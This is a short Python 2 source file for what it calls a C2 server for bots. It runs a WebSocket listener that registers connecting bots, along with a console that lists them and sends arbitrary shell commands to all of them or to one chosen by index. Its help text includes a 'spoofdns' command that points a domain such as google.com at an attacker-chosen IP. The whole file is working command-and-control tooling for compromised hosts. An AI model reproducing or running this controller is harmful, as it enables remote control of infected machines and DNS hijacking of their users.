import os
import threading
from SimpleWebSocketServer import SimpleWebSocketServer, WebSocket

active_connections = list()


class WS_Collector(WebSocket):

    def handleMessage(self):
        print self.data

    def handleConnected(self):
        print(self.address, 'connected')
        active_connections.append(self)
        pass

    def handleClose(self):
        print(self.address, 'closed')
        active_connections.remove(self)
        pass


def RunServer():
    try:
        server = SimpleWebSocketServer('', 8080, WS_Collector)
        server.serveforever()
    except KeyboardInterrupt:
        raise


def CMDInterface():
    try:
        while True:
            cmd = raw_input("Command:")
            if cmd == "?":
                print "Bots Online:\t", str(len(active_connections))
                print "i for bot list"
                print "x to terminate c2"
                print "cmd=XXX to terminate all bots"
                print "cmd=0_XXX to terminate botid == 0"
                print "cmd=0_spoofdns=google.com:1.2.3.4"
            if cmd == "i":
                print "Bots details:\n"
                for bot in active_connections:
                    print bot.address[0]
            if cmd == "x":
                print "Shutting down server...\n"
                os._exit(0)
            if cmd.startswith("cmd="):
                # parse command and bot id
                # string format cmd=botid_command with args
                # cmd=0_spoofdns=google.com:192.168.0.1
                command = cmd.strip("cmd=").split('_')
                if len(command) == 2:
                    active_connections[int(command[0])].sendMessage(command[1])
                elif len(command) == 1:
                    for bot in active_connections:
                        bot.sendMessage(command[0])
                else:
                    print "Invalid command syntax"
                    print "example:", "cmd=0_ls -l"
                    print "example:", "cmd=ls -l"
    except KeyboardInterrupt:
        raise


def main():
    try:
        ws_t = threading.Thread(name="ws_server", target=RunServer)
        ws_t.start()
        cmd_t = threading.Thread(name="ui_server", target=CMDInterface)
        cmd_t.start()
        cmd_t.join()
        ws_t.join()
    except KeyboardInterrupt:
        raise


main()
